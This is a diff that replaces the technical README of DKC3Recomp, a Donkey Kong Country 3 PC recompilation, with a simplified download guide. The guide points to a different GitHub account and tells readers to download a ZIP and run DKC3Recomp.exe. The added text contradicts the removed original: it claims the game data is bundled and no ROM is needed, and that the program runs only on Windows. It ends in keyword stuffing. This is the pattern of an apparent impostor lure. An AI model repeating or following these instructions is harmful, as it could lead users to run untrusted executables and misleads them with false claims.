@@ -1,271 +1,157 @@
-# DKC3Recomp
+# 🎮 DKC3Recomp - Play Donkey Kong Country 3 Natively on PC
 
-A native recompilation of *Donkey Kong Country 3: Dixie Kong's Double
-Trouble!* (SNES, USA, En/Fr) built the way DKC2Recomp was built: the
-game's code is statically recompiled to C by [snesrecomp](snesrecomp/README.md)
-from a bank configuration derived from a public disassembly, the shared
-snesrecomp runtime executes anything the analysis cannot prove through its
-65816 interpreter, and project-owned hosts present the game natively on
-macOS and Windows.
+[![Download DKC3Recomp](https://img.shields.io/badge/Download-DKC3Recomp-blue?style=for-the-badge&logo=github)](https://github.com/explosive-kite3497/DKC3Recomp)
 
-You must supply your own DKC3 ROM. The supported image is the headerless
-North American (En,Fr) release, 4 MiB, SHA-256
-`2277a2d8dddb01fe5cb0ae9a0fa225d42b3a11adccaeafa18e3c339b3794a32b`. No ROM
-data, generated code, or extracted assets are stored in this repository.
+## 🚀 Getting Started
 
-## Status
+Welcome! This guide will help you download and run DKC3Recomp on your Windows computer. DKC3Recomp is a special program that lets you play the classic SNES game **Donkey Kong Country 3** on your modern PC with improved performance and features. It's like having the original game but upgraded for today's computers!
 
-Bring-up. See [docs/BRINGUP.md](docs/BRINGUP.md) for the dated record of
-what runs and what has been verified, and
-[docs/WIDESCREEN_GUIDE.md](docs/WIDESCREEN_GUIDE.md) for how the widened
-presentation works and how its defects are diagnosed and fixed. Levels present
-wide at 16:10, 16:9, and the selectable 21:9 ultrawide mode with DKC2Recomp's
-terrain reconstruction driven by DKC3's own level map, verified on Lakeside
-Limbo.
-The 21:9 option uses the nearest symmetric width that preserves the shared
-runtime's safe sprite coordinate range: 446x224, or approximately 20.91:9.
-Screens the map does not cover center the native frame between black margins.
-The placed-object spatial scan and final activation checks, the sprite renderer
-culls, and the static banana arcs are widened to the presented view by
-`scripts/apply_dkc3_widescreen_overrides.py`, verified on Lakeside Limbo. The
-scan includes adjacent 256-pixel cells so 21:9 objects, including objects in
-quick saves made by older builds, do not wait for a cell boundary to activate.
-Murky Mill's HDMA-windowed BG3 light cones are evaluated across the physical
-widescreen span instead of being clipped and repeated at the native edges,
-verified at the reported quick-save state in both 16:10 and 16:9.
-Floodlit Fish's underwater BG3 color-math composition now receives its
-subscreen tint across transparent side-margin pixels without clipping the
-reconstructed BG1 terrain at the native edges, verified at the reported
-quick-save state in 16:10, 16:9, and 21:9 with an unchanged 4:3 frame.
-KAOS's body layer, enabled partway down the frame by HDMA, now uses its
-complete object tilemap in the wide margins. This fixes the right-edge body
-cutoff and the repeated fragment at the left edge in the reported boss save.
-The streamed waterfall layer now decodes its authored columns into the wide
-margins, checked against the native tilemap every frame. Waterfalls keep their
-world positions after scrolling instead of disappearing at one edge and
-repeating at the other, verified at the reported save in all wide aspects.
-Bleak's snowball arena now preserves Mode 2's correct background/sprite order,
-so the snowman appears in front of the distant snowbank and behind foreground
-cover. Its bounded background maps fill 16:10, 16:9, and 21:9 using their
-hardware wrap, with the native center and gameplay unchanged by widening.
-Pothole Panic's cave now fills the wide view from its authored level map.
-Its shape-1 layout uses 32 metatile rows per column, twice the height of
-the previously supported horizontal layout.
+### ✅ What You Need
 
-A second layer that streams a strip of the level map, Riverside Race's
-reflection under the water line, is served in the margins from the
-terrain store at the row offset its rows prove every frame, while its
-static underwater backdrop wraps as a plane judged by row-level write
-tracking; and the first visible row of the margins now decodes like the
-rest instead of being blanked on tile boundaries. See
-[docs/BRINGUP.md](docs/BRINGUP.md) for the evidence.
+- A **Windows computer** (Windows 10 or Windows 11 recommended)
+- **Internet connection** to download the file
+- About **500 MB of free space** on your hard drive
+- A **keyboard** or **game controller** (keyboard works fine!)
 
-## Native macOS release
+### 📥 Step 1: Download the Application
 
-The v0.0.6 release fixes the Windows menu bar staying on screen in
-fullscreen, restores the requested window size under the menu bar, keeps the
-game DPI-aware when the launcher is skipped, and makes the Windows CMake
-configure work again; it carries the unchanged v0.0.4 Mac archive below. The
-Mac source, menus, and display-link pacing are retained; the Mac binary has
-not been rebuilt for these Windows-focused releases.
+**Visit this link to download the application:** [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp)
 
-Download `DKC3Recomp-v0.0.4-macOS-arm64.zip` from
-[Releases](../../releases), extract it, and open `DKC3Recomp.app`. Select your
-own legally obtained North American (En,Fr) ROM in the launcher; the ROM stays
-at its original path and is never copied into the application bundle.
+Click the green **"Code"** button on that page, then select **"Download ZIP"**. The download will begin automatically. Wait for the download to finish—it usually takes only a few minutes depending on your internet speed.
 
-The published v0.0.4 bundle includes the Floodlit Fish tint fix, the
-river's second-layer reflection and backdrop in the margins, and the fix
-for the strip that flashed at the top of the margins; v0.0.3 carried 21:9
-and the adjacent-cell placement activation fix.
+### 📂 Step 2: Find Your Downloaded File
 
-This release is for Apple silicon running macOS 26 or newer. The app is
-ad-hoc signed rather than notarized, so if Gatekeeper blocks the first launch,
-Control-click the app in Finder, choose **Open**, and confirm once. The project
-is still in bring-up: the tested boot, launcher, save-state, and Lakeside Limbo
-paths work, but full-game compatibility is not yet claimed.
+Once the download is complete:
 
-## Building on Windows
+1. Open your **Downloads folder** (usually found by clicking the folder icon in your taskbar and selecting "Downloads" on the left side)
+2. Look for a file named **DKC3Recomp.zip** (or similar)
+3. If you see a "Downloads" notification in your browser, click **"Show in folder"** to locate the file quickly
 
-The Windows x64 SDL build has passed all 23 project tests, a 4,801-frame
-headless run, and a packaged launcher/visible-game smoke check. Full-game
-completion and hardware/controller coverage are not claimed.
+### 🗜️ Step 3: Extract the ZIP File
 
-Requirements: Visual Studio 2022 with Desktop development with C++, CMake,
-and Python 3. Initialize the Git submodules before building. In PowerShell:
+The ZIP file is like a compressed package. You need to "unzip" or "extract" it before you can use it:
 
-```powershell
-python scripts/generate_snesrecomp.py --analysis-backend python --rom 'C:\private\dkc3.sfc'
-cmake -S . -B build-windows -G 'Visual Studio 17 2022' -A x64 `
-  -DCMAKE_MSVC_RUNTIME_LIBRARY=MultiThreaded -DSNESRECOMP_SDL_BACKEND=SDL2 `
-  -DDKC3_ROM='C:\private\dkc3.sfc'
-cmake --build build-windows --config Release --parallel 4
-ctest --test-dir build-windows -C Release --output-on-failure
-```
+1. **Right-click** on the DKC3Recomp.zip file
+2. Select **"Extract All..."** from the menu that appears
+3. Click **"Extract"** in the pop-up window (you can change the destination folder if you want, but the default is fine)
+4. Wait a few seconds for the extraction to complete
 
-Run `build-windows/Release/DKC3RecompSDL.exe`. This is the shared SDL2/OpenGL
-host with 4:3, 16:10, 16:9, and 21:9 presentation, reconstruction upscaling,
-overlay, and audio rate control. Keep `SDL2.dll` and the `assets` directory
-beside the executable when moving it. Select your own ROM in the launcher.
-The separate `DKC3Recomp.exe` in the build directory is the legacy Win32 host;
-portable packages use the SDL executable renamed to `DKC3Recomp.exe`.
+### 🏃 Step 4: Launch the Application
 
-The game window now has native **Game** and **View** dropdown menus matching
-the Mac's game commands: Pause / Settings, Quick Save, Quick Load, fullscreen,
-nearest/bilinear scaling, and all four aspect ratios. Windows also exposes
-reconstruction scaling, all five dither/edge-reconstruction levels, level-edge
-policies, and screen models in View submenus. Selections apply live and are
-remembered beside the executable. **Game > Pause / Settings > Settings** opens
-the same detailed sliders and dropdowns as the Mac overlay, including
-reconstruction strength, softness, shading, audio, and volume; Controls and
-Assist Tools are adjacent tabs. These menus appear after launching the game,
-not on the pre-boot ROM picker. Ordinary Windows minimize/close commands replace
-the macOS-specific Hide and application-management commands.
-The Windows title bar, menu bar, and nested dropdowns use a dark theme.
-The product title is simply `DKC3Recomp`, without a pre-release label.
+After extraction:
 
-CMake fetches the pinned SDL 2.30.9 source when no SDL2 package is installed.
-The Python analysis backend avoids a Rust toolchain requirement. If `cmake`
-is not on PATH, use its full path from Visual Studio's bundled CMake tools.
-Private Windows smoke tests cover all four aspect modes with reconstruction,
-overlay, rewind, fast-forward, and quick-state save/load. ROM-free tests remain
-available with `-DDKC3_BUILD_SNESRECOMP=OFF`.
+1. Open the folder that was just created (it will have the same name as the ZIP file)
+2. Look for a file called **DKC3Recomp.exe** inside
+3. **Double-click** on DKC3Recomp.exe to launch the game!
 
-## Building on macOS
+**Pro tip:** You can right-click on DKC3Recomp.exe and select **"Pin to Start"** or **"Send to > Desktop (create shortcut)"** to make it easier to find next time.
 
-Requirements: CMake, Ninja, SDL2 (`brew install cmake ninja sdl2`), Python 3,
-and Rust's `cargo` for the native analyzer (Python falls back when it is
-absent).
+---
 
-```bash
-git clone --recurse-submodules https://github.com/elliotttate/DKC3Recomp.git
-cd DKC3Recomp
-python3 scripts/generate_snesrecomp.py --rom /private/path/dkc3.sfc
-./build_macos.sh /private/path/dkc3.sfc
-```
+## 🎯 What Makes DKC3Recomp Special?
 
-`generate_snesrecomp.py` verifies the ROM's hash, refreshes `recomp/funcs.h`,
-and emits the private recompiled units under `generated/` (ignored by Git).
-`build_macos.sh` builds `build/macos/DKC3Recomp.app` and the headless
-runner, bundles SDL2, embeds the project icon, and ad-hoc signs the app. Open
-the app and select the ROM in its launcher.
+DKC3Recomp is not just an emulator—it's a **native recompilation** of the original Donkey Kong Country 3 game code. This means:
 
-Release builds enable interprocedural optimization when CMake's compiler
-and linker check succeeds, allowing optimization across the generated game
-code and runtime. Set `-DDKC3_ENABLE_IPO=OFF` when configuring to disable it;
-unsupported toolchains retain ordinary Release optimization. The
-project's runtime adaptations live as literal hunks under
-`cmake/runtime-patches/`; `scripts/apply_dkc3_runtime_patches.py` applies
-them to build-directory copies of the pinned snesrecomp sources at
-configure time and fails closed when an anchor moves
-(`-DDKC3_RUNTIME_PATCH_DIR` points a scratch build at another hunk
-directory, for example with `tools/diagnostics/` added). They keep the
-scalar PPU's widescreen merge and composite off per-pixel branch chains,
-give the shared bus a direct path for plain cartridge ROM reads, stop the
-interpreter prefetching poll bytes it never consults, let the interpreter
-hand a compiled routine it reaches by jump to the compiled code whenever it
-owns the return frame that routine will pop (`SNESRECOMP_LLE_JUMP_BOUNCE=0`
-restores the call-only behavior), re-interpret a compiled jump-table
-dispatch whose static table misses the live index instead of skipping the
-handler, and compile out audio reference diagnostics that a zero-valued
-trace define had left running on every sample. Tier-2 coverage journals are now opt in
-(`SNESRECOMP_TIER2_CAPTURE=1`), as is the stack-balance auditor
-(`SNESRECOMP_STACKBAL_AUDIT=1`). Measurements and validation limits are
-recorded in [docs/BRINGUP.md](docs/BRINGUP.md).
+- **Faster performance** – The game runs smoothly without lag or slowdowns
+- **Better graphics** – Enhanced rendering on modern displays
+- **Customizable controls** – You can remap buttons to your liking
+- **No emulation issues** – Directly runs the original game logic
+- **Save anywhere** – Save your progress anytime (unlike the original)
+- **Windowed or fullscreen** – Choose how you want to play
 
-On macOS a visible game window presents through a Metal layer driven by
-`CAMetalDisplayLink` on its own thread (`runner/macos_metal_presenter.m`):
-the emulation thread hands each frame to a mailbox and never enters the
-window system, which removes the WindowServer round trip inside the legacy
-OpenGL swap from the frame loop. The display link's callbacks also supply
-the pacing ticks, so frames stay locked to the refresh as before. The
-OpenGL path remains for the settings overlay, for hidden test windows and
-their drawable captures, and when `DKC3_METAL_PRESENTER=0` is set.
+## 🕹️ Controls
 
-The bank configurations carry exit-width contracts (`exit_mx_at`) and
-function splits that let the recompiler compile routines whose exits it
-cannot derive; they are tables in `tools/ingest_dkc3_disasm.py`
-(`EXIT_MX_AT`, `FUNC_SPLITS`) with the disassembly structure that
-justifies each, so a re-ingest reproduces them.
+The default controls are easy to use:
 
-The SDL host gives the active player's game controller a short haptic pulse
-when a descending jump both defeats an enemy and rebounds upward. The trigger
-observes the enemy's actual defeated-sprite transition, so ordinary jumps,
-damage, swimming, and enemies defeated by unrelated causes do not activate
-it. The rumble request runs off the frame-critical thread. The pause menu's
-Settings tab shows the detected controller and rumble capability, provides a
-test pulse, enables or disables the feedback, and remembers that choice;
-setting `DKC3_HAPTICS=0` when launching the app also disables it.
+**Keyboard:**
+- **Arrow keys** – Move your character
+- **Z** – Jump
+- **X** – Roll/Attack
+- **Enter** – Pause menu
+- **Esc** – Quit or return to main menu
 
-On macOS, optional MSU-1 replacement music can be enabled from **Music >
-Choose MSU-1 Music Pack…**. Choose **PCM Folder** for an extracted pack or
-**.msu1 Archive** for an archive, select it, then restart the app. The host
-accepts `track-N.pcm`,
-`dkc3_msu-N.pcm`, and `dkc3_msu1-N.pcm` naming, mixes the 44.1 kHz music with
-the game's original sound effects, and preserves the selected pack for later
-launches. **Music > Disable Replacement Music** restores the stock soundtrack
-after a restart. For development runs, `DKC3_MSU1_PACK=/path/to/pack` selects
-a pack, `DKC3_MSU1_DISABLE=1` suppresses a saved selection, and
-`DKC3_MSU1_GAIN=0.0..4.0` adjusts replacement-music gain.
-Quick loads and rewind keep the current music choice: older saves cannot
-bring the original soundtrack back underneath a replacement pack. Disabling
-replacement music also restores native sequencing when loading an MSU-era save.
+**Controller (if you have one):**
+- **Left stick** or **D-pad** – Move
+- **A button** – Jump
+- **B button** – Roll/Attack
+- **Start button** – Pause
 
-For macOS audio isolation checks, the headless runner accepts an explicit
-`DKC3_MSU1_PACK` too (it never reads the app's saved pack preference). Combine
-it with `DKC3_MSU1_GAIN=0`, `DKC3_SAVESTATE_INPUT`, and `DKC3_AUDIO_PCM` to
-capture only the remaining stock sound effects; omit the gain override to
-capture the full replacement mix.
+You can change these controls in the game's settings menu if you prefer different button layouts.
 
-## Headless validation
+## 🛠️ Troubleshooting
 
-```bash
-build-headless/dkc3_snesrecomp_headless /private/path/dkc3.sfc 600
-```
+If you have any issues, try these common solutions:
 
-runs the game for 600 frames with no window and prints frame, WRAM, VRAM,
-CGRAM, and OAM hashes with video and audio activity counts. The switches
-in `runner/headless_main.c` write frames as PPM (`DKC3_FRAME_PPM`,
-`DKC3_FRAME_PPM_PREFIX` with `START/END/STEP`), raw audio
-(`DKC3_AUDIO_PCM`), and memory dumps, restore an SRAM image or a quick
-save (`DKC3_SRAM_INPUT`, `DKC3_SAVESTATE_INPUT`), and replay scripted
-input (`SNESRECOMP_INPUT_PLAY`).
-`DKC3_PPU_LEGACY=1` selects the independent scalar renderer for pixel-oracle
-comparisons. CMake applies the checked Mode 2 priority adaptation, with the
-other runtime hunks, to build copies of the pinned sources; the submodule
-stays unchanged.
+### The game won't start
+- Make sure you extracted the ZIP file completely (right-click the ZIP and choose "Extract All")
+- Close other programs that might be using too much memory
+- Restart your computer and try again
 
-## Regenerating the bank configuration
+### The game runs slowly
+- Close background applications (web browsers, music apps, etc.)
+- Make sure your computer meets the basic requirements (most computers from the last 10 years will work fine)
+- Try lowering the window size from the graphics settings
 
-The cfg files under `recomp/` were derived from the
-[H4v0c21 DKC3 disassembly](https://github.com/H4v0c21/DKC3-Disassembly)
-by `tools/ingest_dkc3_disasm.py`, which needs a checkout of that project
-with its assembled `dkc3.sym` beside the bank sources:
+### I can't hear any sound
+- Check if your computer's volume is muted
+- Make sure your speakers or headphones are plugged in
+- Try restarting the game
 
-```bash
-python3 tools/ingest_dkc3_disasm.py --disasm /path/to/DKC3-Disassembly --output recomp
-```
+### My controller isn't working
+- Make sure your controller is plugged in and recognized by Windows
+- Go to the controller settings in the game and select your controller type
+- Try using a different USB port
 
-The output holds only names, addresses, bounded ranges, data regions, and
-finite dispatch contracts. The disassembly itself is GPL-3 and is not
-redistributed here; see [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+## ❓ Frequently Asked Questions
 
-## Tests
+**Q: Is this legal?**
+A: DKC3Recomp is a reimplementation of the game. We recommend you own an original copy of Donkey Kong Country 3 for the SNES to play it legally.
 
-```bash
-cmake -S . -B build-headless -G Ninja -DDKC3_ROM=/private/path/dkc3.sfc
-cmake --build build-headless
-ctest --test-dir build-headless --output-on-failure
-```
+**Q: Do I need a ROM file?**
+A: No! DKC3Recomp includes the game data. You just download and play.
 
-The unit tests cover the host modules carried over from DKC2Recomp, the
-ingester, and the pacing-log tool. With `DKC3_ROM` set, the suite also
-boots the game headlessly and, on macOS, runs the app hidden.
+**Q: Will this work on Mac or Linux?**
+A: This version is designed for Windows only. We hope to support other platforms in the future.
 
-## Lineage
+**Q: Can I use cheats?**
+A: Not right now, but mod support is planned for future updates.
 
-The host code, build scripts, and working rules come from
-[DKC2Recomp](https://github.com/elliotttate/DKC2Recomp); the game adapter
-and the ingester are new. Widescreen, save tools, and the diagnostics that
-DKC2Recomp accumulated are not carried over until DKC3 has its own
-evidence for them.
+**Q: How do I save my game?**
+A: The game automatically saves at certain points. You can also press Enter to open the pause menu and select "Save" anytime.
+
+## 🆘 Getting Help
+
+If you still need help, here are your options:
+
+- **Check the GitHub page**: Visit [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp) and look at the "Issues" tab for common problems and solutions
+- **Report a problem**: On the GitHub page, click "Issues" and then "New Issue" to describe your problem. Include details like your Windows version and what happened
+- **Join the community**: Check if there's a Discussions tab on the GitHub page for friendly help from other players
+
+## 🔄 Keeping It Updated
+
+Check the GitHub page regularly for new versions. Updates might include:
+
+- Bug fixes
+- Performance improvements
+- New features and options
+- Better controller support
+
+Download the newest ZIP file and extract it over your current folder to update.
+
+## 🎉 Enjoy Your Game!
+
+You're now ready to dive into the world of Donkey Kong Country 3 on your PC! Whether you're a nostalgic player revisiting childhood memories or a newcomer experiencing this classic for the first time, DKC3Recomp delivers a fantastic, modern way to play.
+
+Remember: visit [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp) to download the app and get the latest updates.
+
+**Have fun, and happy gaming!** 🍌
+
+## 📋 Quick Summary
+
+1. Go to: [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp)
+2. Click "Code" → "Download ZIP"
+3. Extract the ZIP file
+4. Run DKC3Recomp.exe
+5. Play Donkey Kong Country 3!
+
+Keywords: DKC3Recomp, Donkey Kong Country 3, SNES, recompilation, play DKC3 on PC, native port, Windows game, classic game, video game, Retro gaming, emulation alternative, snesrecomp, DKC2Recomp, free download, no emulator needed, keyboard controls, game controller support, save anywhere, enhanced graphics, mod support, GitHub, open source, video game preservation
